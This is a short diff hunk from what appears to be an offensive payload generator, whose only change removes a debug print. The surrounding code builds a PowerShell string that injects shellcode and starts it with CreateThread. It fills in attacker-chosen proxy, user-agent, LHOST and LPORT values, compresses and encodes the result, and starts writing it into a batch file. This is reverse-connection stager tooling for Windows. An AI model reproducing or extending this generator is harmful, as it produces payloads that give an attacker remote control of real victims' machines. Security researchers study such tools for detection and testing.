@@ -47,7 +47,6 @@ $o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" 
                                                                               "" if self.required_options["PROXY"][0] == "N" else proxyString,
                                                                               self.required_options["USER_AGENT"][0],
                                                                               self.required_options["LHOST"][0], self.required_options["LPORT"][0])
-        print(baseString)
         encoded = helpers.deflate(baseString)
 
         payloadCode = "@echo off\n"
